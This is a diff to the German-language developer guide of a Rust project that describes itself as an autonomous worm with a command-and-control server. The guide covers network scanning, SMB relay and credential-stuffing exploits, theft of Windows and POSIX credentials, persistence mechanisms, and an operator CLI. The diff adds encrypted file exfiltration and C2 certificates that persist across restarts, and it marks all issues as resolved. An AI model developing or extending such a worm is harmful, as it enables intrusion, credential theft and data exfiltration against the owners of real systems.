@@ -37,7 +37,7 @@ Das Repository-Root enthält keinen Code; die Architektur beginnt unter `kx/`.
   (`rustc 1.99.1` verifiziert auf dem macOS-Host). Cargo-Arbeitsverzeichnis ist
   ausschließlich `kx/` — der Workspace-Root ist `kx/`, nicht das Repo-Root.
 - **PATH:** `export PATH="$HOME/.cargo/bin:$PATH"`, falls rustup pro Shell frisch.
-- **Tests:** `cargo test --workspace` — 186 Tests grün, 0 Fehler (Stand 2026-11-16).
+- **Tests:** `cargo test --workspace` — 267 Tests grün, 0 Fehler (Stand 2026-11-25).
 - **Qualität:** `cargo fmt --check` ist grün und wird in der CI **erzwungen**
   (seit Commit 825511b ist der Workspace formatiert). `cargo clippy
   --workspace --all-targets` meldet noch einige Warnungen — clippy ist bewusst
@@ -54,7 +54,7 @@ export PATH="$HOME/.cargo/bin:$PATH"
 # Bauen (CI-Matrix: Ubuntu und macOS)
 cargo build --workspace --all-targets
 
-# Tests (164 grün); gezielt ein Crate:
+# Tests (267 grün); gezielt ein Crate:
 cargo test --workspace
 cargo test -p kx-core
 
@@ -130,9 +130,10 @@ nur zu laufen:
 
 **Windows-Test?** → [`docs/runbooks/windows-test.md`](./docs/runbooks/windows-test.md)
 enthält die Voraussetzungen, den Weg zum ersten Lauf und die Stolperfallen —
-darunter die, die nicht im Code stehen: der C2 erzeugt bei jedem Start ein
-neues Zertifikat, `rsync` überträgt Zeitstempel, und die Windows-Werkzeuge
-schreiben ihre Fehler nach stdout.
+darunter die, die nicht im Code stehen: `rsync` überträgt Zeitstempel, und die
+Windows-Werkzeuge schreiben ihre Fehler nach stdout. Das TLS-Material des C2
+persistiert inzwischen über Neustarts (ADR-0006) — der alte Stolperstein
+„neues Zertifikat bei jedem Start" ist damit erledigt.
 
 ## Architecture
 
@@ -140,15 +141,15 @@ schreiben ihre Fehler nach stdout.
 
 | Crate        | Aufgabe                                              |
 |--------------|------------------------------------------------------|
-| `kx-core`    | C2-Protokoll (`c2`) samt Transport, Kryptografie (`hostkey`, `secretbox`), die Formen der Beute (`secret`, `exfil`), die Persistenz-Invocation (`persist`), KXENC-Dateiformat (`format`), Textkodierungen (`codec`), Schlüsselarten (`kex`) |
+| `kx-core`    | C2-Protokoll (`c2`) samt Transport, Kryptografie (`hostkey`, `secretbox`), die Formen der Beute (`secret`, `exfil`), die Persistenz-Invocation (`persist`), KXENC-Dateiformat (`format`) samt Chiffre (`kxenc`), Textkodierungen (`codec`), Schlüsselarten (`kex`) |
 | `kx-scanner` | ARP-Hostentdeckung (`arp_sweep`), TCP-Portscan (`scan_tcp`), `fingerprint` |
 | `kx-exploit` | SMB-Relay (`smb_relay_dcsync`), Credential-Stuffing (`try_default_credentials`) via Impacket |
 | `kx-win`     | Windows-Secrets (LSASS, Credential Manager, Browser) + Persistenz (Dienst, Run-Key, Scheduled Task) |
 | `kx-posix`   | POSIX-Secrets (`/etc/shadow`, SSH, AWS) + Persistenz (systemd-Unit, Cron) |
 | `kx-tls`     | selbstsignierte Zertifikate (`generate_server_tls`), rustls-Configs (`client_config_trusting`) — die Client-Konfiguration nutzt der Transport in `kx-core` |
 | `kx-server`  | C2-Backend: axum-API, SQLite (`hosts`, `secrets`, `tasks`), HTML-Dashboard — Bibliothek (`lib.rs`) **und** Binary (`main.rs`) |
-| `kx-agent`   | der autonome Wurm: orchestriert Scanner → Exploit → Secrets → Persistenz → C2-Report; der Lauf liegt in `lauf.rs`, die Meldung in `meldung.rs` |
-| `kx-cli`     | Operator-CLI (`hosts`, `secrets`, `export --format json|csv`, `tasks`) |
+| `kx-agent`   | der autonome Wurm: orchestriert Scanner → Exploit → Secrets → Persistenz → C2-Report; der Lauf liegt in `lauf.rs`, die Meldung in `meldung.rs`, die Datei-Exfiltration in `datei.rs` |
+| `kx-cli`     | Operator-CLI (`hosts`, `secrets`, `export --format json|csv`, `tasks`, `files`, `file-open`) |
 
 Schichtung: `kx-core` und `kx-scanner` sind Basislagen; `kx-core` bindet seit
 dem Transport in den Kern (ADR-0002) `kx-tls` ein. `kx-agent` ist der einzige
@@ -169,11 +170,11 @@ CLI importieren alle aus diesem Modul — Pfad-Konstanten (`PATH_REGISTER`,
 in der CLI. Wer einen Pfad oder ein Feld nur an einer Stelle ändert, bricht den
 Vertrag.
 
-- **Antworttypen** (`Host`, `ExfiltratedSecret`, `Task`) tragen
+- **Antworttypen** (`Host`, `ExfiltratedSecret`, `Task`, `ExfiltratedFile`) tragen
   `#[serde(deny_unknown_fields)]` — streng. Sie werden vom Server erzeugt und vom
   Client gelesen; hier entsteht der Schaden, also bricht es hier laut.
 - **Request-Typen** (`RegisterRequest`, `HeartbeatRequest`, `SecretUpload`,
-  `CreateTaskRequest`) sind lenient — unbekannte Felder werden ignoriert. Ein
+  `CreateTaskRequest`, `FileUpload`) sind lenient — unbekannte Felder werden ignoriert. Ein
   neuerer Agent darf ein Feld ergänzen, ohne einen älteren Server zu brechen.
 - **Die Datenbankzeile ist nicht der Wire-Typ.** `kx-server` hält
   `HostRow`/`SecretRow`/`TaskRow` ohne serde und wandelt sie über `From` in die
@@ -205,22 +206,27 @@ Operator entschlüsselt mit `kx-cli secrets --decrypt --server-key <bundle>`.
 ### Binaries und API
 
 - `kx-server`: `--host` (`127.0.0.1`), `--port` (`8443`), `--db` (`kx.db`), `--token`
-  (Env `KX_SERVER_TOKEN`), `--cn` (`kx.local`). Das Token ist **Pflicht** — fehlt es
+  (Env `KX_SERVER_TOKEN`), `--cn` (`kx.local`), `--cert`/`--key` (Default
+  `kx-server.crt`/`.key` neben der Datenbank). Das Token ist **Pflicht** — fehlt es
   oder ist es leer, startet der Server nicht (Exit 1): ein leerer Erwartungswert
   passt zu jedem leeren `Bearer`-Header und würde die API öffnen. Das Token steht
   im `AppState`, nicht in einer Environment-Variable — eine Variable ist prozessweit
-  und wirkt auf alle Tests. Zertifikat und Schlüssel bleiben im
-  Speicher; es wird keine `kx-server.crt`/`.key` geschrieben.
+  und wirkt auf alle Tests. Zertifikat und Schlüssel **persistieren** neben der
+  Datenbank (Schlüssel `0600`), damit Agenten einen Neustart überstehen, ohne ihr
+  gepinntes Zertifikat zu erneuern ([ADR-0006](./docs/adr/0006-der-c2-behaelt-sein-tls-material-ueber-neustarts.md), Issue #65).
 - `kx-agent`: `--server`/`--token` (Env `KX_C2_URL`/`KX_C2_TOKEN`), `--server-cert`,
   `--iface` (`eth0`), `--start`/`--end` (Pflichtargumente), `--own-ip`, `--hosts`,
   `--relay-script`, `--server-key` (öffentlicher Server-Schlüssel als JSON-Datei —
-  ohne diese Option versiegelt der Agent nichts).
+  ohne diese Option versiegelt der Agent nichts), `--exfil-file` (Datei als
+  KXENC-Container exfiltrieren, mehrfach angebbar; braucht `--server-key`).
 - `kx-cli`: globale Flags `--server`, `--token`, `--cert`; Subcommands `hosts`,
-  `secrets --user`, `export <pfad> --format`, `tasks`, `task-create --host-id --command`.
+  `secrets --user`, `export <pfad> --format`, `tasks`, `task-create --host-id --command`,
+  `files`, `file-open --file-id --out --server-key`.
 - Routen (Bearer-Auth per `route_layer(require_auth)`, constant-time): `POST
   /api/register`, `POST /api/heartbeat`, `POST /api/secrets`, `GET /api/hosts`,
   `GET /api/secrets`, `GET /api/tasks`, `POST /api/tasks/new` (Task anlegen),
-  `POST /api/tasks/result` (Task-Ergebnis melden); dazu `GET /` (Dashboard) und
+  `POST /api/tasks/result` (Task-Ergebnis melden), `POST /api/files` (KXENC-Container
+  hochladen, Duplikat → 409), `GET /api/files` (Container listen); dazu `GET /` (Dashboard) und
   `POST /api/login`. Der Login-Pfad steht bewusst neben dem geschützten
   API-Subrouter.
 - Der Agent holt offene Tasks über `GET /api/tasks`, führt sie aus und meldet das
@@ -282,11 +288,11 @@ ISSUE-14 (Credential-Test prüft den Dienst und läuft unter einer Zeitgrenze),
 ISSUE-4 (Credential Manager liefert bei einem Credential eine Liste),
 ISSUE-5 (Doc-Fix `--range`), ISSUE-7 (der WMI-Pfad wurde entfernt statt
 verdrahtet), ISSUE-9 (das Hybrid-KEM ist aktiv, der Master-Key wird je Host
-versiegelt gemeldet), ISSUE-11 (das Token-Feld maskiert den Debug-Output).
-
-**Offen:** ISSUE-15 — das KXENC-Containerformat hat keine Chiffre. `format.rs`
-beschreibt Layout, AAD und Noncen, verschlüsselt aber nichts; Dateiexfiltration
-gibt es nicht. Die Secret-Exfiltration läuft über `kx-core/src/secretbox.rs`.
+versiegelt gemeldet), ISSUE-11 (das Token-Feld maskiert den Debug-Output),
+ISSUE-15 (die KXENC-Chiffre lebt in `kx-core/src/kxenc.rs`; der Agent
+exfiltriert Dateien mit `--exfil-file` als Container neben das Original,
+der Server dedupliziert je `(host_id, file_id)` unter `/api/files`, der
+Operator öffnet sie mit `kx-cli file-open`). Damit sind alle 15 Issues erledigt.
 
 **Dokumentations-Drift:** Der Modul-Doc von `kx-core/src/lib.rs` beschreibt noch
 eine Schichtung `format → crypto → engine → beacon` aus einem Vorgängerprojekt —
@@ -311,14 +317,14 @@ kx/
 ├── assets/              # smbrelayx.py (Impacket, Apache-Lizenz)
 ├── HANDOFF.md              # Übergabenotiz zum Arbeitsstand
 └── crates/
-    ├── kx-core/            # c2.rs (C2 Protocol), transport.rs, secret.rs, exfil.rs, persist.rs, hostkey.rs, secretbox.rs, format.rs, error.rs, codec.rs, kex.rs
+    ├── kx-core/            # c2.rs (C2 Protocol), transport.rs, secret.rs, exfil.rs, persist.rs, hostkey.rs, secretbox.rs, format.rs, kxenc.rs, error.rs, codec.rs, kex.rs
     ├── kx-scanner/         # arp.rs (nur Linux), tcp_scan.rs, fingerprint.rs
     ├── kx-exploit/         # smb_relay.rs, smbrelayx.rs, credential_stuff.rs, payload.rs, examples/
     ├── kx-win/             # secrets.rs, persist.rs
     ├── kx-posix/           # secrets.rs, persist.rs
     ├── kx-tls/             # lib.rs (rustls/rcgen)
     ├── kx-server/          # lib.rs, main.rs, auth.rs, db.rs, dashboard.rs, e2e_test.rs, tests/vertrag.rs
-    ├── kx-agent/           # main.rs, lauf.rs, meldung.rs, propagate.rs, c2.rs, tasks.rs, hostkey.rs
+    ├── kx-agent/           # main.rs, lauf.rs, meldung.rs, propagate.rs, c2.rs, tasks.rs, hostkey.rs, datei.rs
     └── kx-cli/             # main.rs, client.rs, decrypt.rs
 ```
 
